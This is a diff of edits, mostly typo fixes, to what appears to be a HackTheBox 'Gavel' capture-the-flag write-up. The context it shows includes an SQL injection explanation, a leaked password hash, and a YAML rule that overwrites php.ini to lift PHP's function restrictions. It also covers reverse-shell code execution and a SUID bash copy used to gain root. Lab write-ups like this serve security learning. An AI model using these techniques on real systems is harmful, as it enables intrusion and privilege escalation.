@@ -105,7 +105,7 @@ In vscode we analyze the different files and identify some vulnerable code.
 
 ![SQLi in source code](/images/HTB-Gavel/gavel_sqli_code.png)
 
-The application uses PDO (PHP Data Objects) prepared statements. However the `sort` and `user_id` parameter are directly accepted in the URL. Without satisfactory input sanitization this can lead to an SQL injection vulnerability.  [Here](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#pdo-prepared-statements), we learn how to exploit SQLis in PDO prepared statements.
+The application uses PDO (PHP Data Objects) prepared statements. However the `sort` and `user_id` parameter are directly accepted in the URL. Without satisfactory input sanitization this can lead to an SQL injection vulnerability. [Here](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#pdo-prepared-statements), we learn how to exploit SQLis in PDO prepared statements.
 
 The `bid_handler.php` logic retrieves the `rule` field from the `auctions` table and passes it directly into `runkit_function_add()` as the body of a dynamically generated `ruleCheck()` function. Since this function is executed immediately afterward, control over the `rule` field translates directly into arbitrary PHP code execution.
 
@@ -153,7 +153,7 @@ By closing the backtick context and injecting a derived query that aggregates `u
 
 ![leaked database data](/images/HTB-Gavel/gavel_pwd_hashes.png)
 
-The password hash of `auctioneer` is returned.
+The password hash of the user `auctioneer` is returned.
 ```
 auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
 ```
@@ -188,7 +188,7 @@ So our exploitation is in four steps:
 2. Get the `auction_id` parameter values.
 
 > We know that `auction_id` is the parameter used because it is present in the page source code. It is also observable in the requests if Burp is used. 
-> Since every auction is time-limited and linked to a unique auction_id, the exploitation steps must be carried out before the auction expires, after which the identifier is no longer valid.
+> Since every auction is time-limited and linked to a unique `auction_id`, the exploitation steps must be carried out before the auction expires, after which the identifier is no longer valid.
 
 ```
 curl -s http://gavel.htb/bidding.php -H 'Cookie: gavel_session=COOKIE_VALUE' | grep 'auction_id'
@@ -219,7 +219,7 @@ On our listener we get a shell as `www-data`.
 
 ![Foothold on the Gavel machine](/images/HTB-Gavel/gavel_foothold.png)
 
-Checking `/etc/passwd` confirms the presence of the `auctioneer` user. The password we use on the web application is valid for the user account.
+Checking `/etc/passwd` confirms the presence of the `auctioneer` user. The password we used on the web application is valid for the user account.
 
 ![Gavel user flag](/images/HTB-Gavel/gavel_user_flag.png)
 
@@ -258,9 +258,9 @@ function ruleCheck($current_bid, $previous_bid, $bidder) {
 }
 ```
 
-And this is why our reverse shell command triggers when we place a bid.
+And this is why our reverse shell command triggers when we place and win a bid as `auctioneer`.
 
-In a nutshell the exploit succeeds because `bid_handler.php` treats the `rule` database field as PHP code. Submitting a bid causes the application to compile that field into a runtime function via `runkit_function_add()` and execute it. By storing a reverse-shell command in the rule body, the bid submission directly triggers remote code execution.
+In a nutshell the exploit succeeds because `bid_handler.php` treats the `rule` database field as PHP code. Submitting a bid causes the application to compile that field into a runtime function via `runkit_function_add()` and execute it. By storing a reverse-shell command in the rule body, the application triggers remote code execution when the bid ends.
 
 > Our payload only works because PHP is allowed to call `system()`. 
 
@@ -299,7 +299,7 @@ echo 'rule_msg: "newini"' >> new_ini.yaml
 echo "rule: file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\\ndisplay_errors=On\\nopen_basedir=\\ndisable_functions=\\n\"); return false;" >> new_ini.yaml
 ```
 
-We subnit the file.
+We submit the file.
 ```
 /usr/local/bin/gavel-util submit /home/auctioneer/new_ini.yaml
 ```
@@ -332,7 +332,7 @@ Submit the YAML file
 ls -lh /opt/gavel/
 ```
 
-We now have a copy of teh bash binary with the SUID bit set.
+We now have a copy of the bash binary with the SUID bit set.
 
 ![Gavel SUID bash](/images/HTB-Gavel/gavel_SUID_bash.png)
 
